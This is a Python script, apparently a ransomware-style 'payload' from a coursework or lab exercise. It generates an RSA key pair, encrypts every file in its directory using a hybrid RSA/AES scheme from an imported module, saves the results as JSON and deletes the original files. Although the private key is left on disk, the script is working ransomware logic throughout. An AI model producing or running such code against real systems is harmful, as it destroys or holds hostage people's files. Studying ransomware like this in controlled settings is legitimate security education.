import os
import sys
import pdb

import json
from base64 import b64encode
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
import MyEncrypt
import MyDecrypt
import constants

def genRSAKey():
    print("Generating RSA Keys")
    privateKey = rsa.generate_private_key(
            public_exponent = constants.PUBLIC_EXPONENT, 
            key_size = constants.RSA_KEY_LENGTH, 
            backend = default_backend()
            )
    privatePEM = privateKey.private_bytes(
            encoding = serialization.Encoding.PEM, 
            format = serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm = serialization.NoEncryption()
            )
    with open(constants.PRIVATE_KEY_FILE_PATH, 'wb') as f:
        f.write(privatePEM)
    publicKey = privateKey.public_key()
    publicPEM = publicKey.public_bytes(
            encoding = serialization.Encoding.PEM,
            format = serialization.PublicFormat.SubjectPublicKeyInfo
            )
    with open(constants.PUBLIC_KEY_FILE_PATH, 'wb') as f:
        f.write(publicPEM)

# Encrypt every file within the directory that the payload is located

# Generate private/public key if it does not already exist
if((not os.path.isfile(constants.PUBLIC_KEY_FILE_PATH)) or (not os.path.isfile(constants.PRIVATE_KEY_FILE_PATH))):
    genRSAKey()

# pdb.set_trace()

# Gather all fileNames
allFileNames = [f for f in os.listdir(".") if os.path.isfile(os.path.join(".", f))]

# Debugging Stuff
# print(allFileNames)
# pdb.set_trace()

# Loop for each file
for filePath in allFileNames:
    # Do not encrypt the private key
    #  print(filePath)
    #  pdb.set_trace()
    if ((filePath != "privateKey.pem") and (filePath != "payload") and (filePath != "publicKey.pem")):
        print("Encrypting: " + filePath)

        # Call the encryptor
        RSACipher, cipherText, IV, tag, ext = MyEncrypt.MyRSAEncryptMAC(filePath = filePath, RSAPublicKeyFilePath = constants.PUBLIC_KEY_FILE_PATH)

        # Create json file from dictionary
        fileName = filePath.rsplit(".", 1)[0]
        jsonFileName = fileName + ".json"
        outfile = open(jsonFileName, 'w')

        jsonData = {}

        # Create the dictionary
        jsonData["RSACipher"] = b64encode(RSACipher).decode('utf-8'),
        jsonData["Cipher Text"] = b64encode(cipherText).decode('utf-8'), 
        jsonData["IV"] = b64encode(IV).decode('utf-8'), 
        jsonData["Tag"] = b64encode(tag).decode('utf-8'), 
        jsonData["Extension"] = ext

        # Write to json
        json.dump(jsonData, outfile, ensure_ascii=False)
        outfile.close()

        # Delete the original file
        os.remove(filePath)

        print("Results of encryption stored at: " + jsonFileName)
        print("")
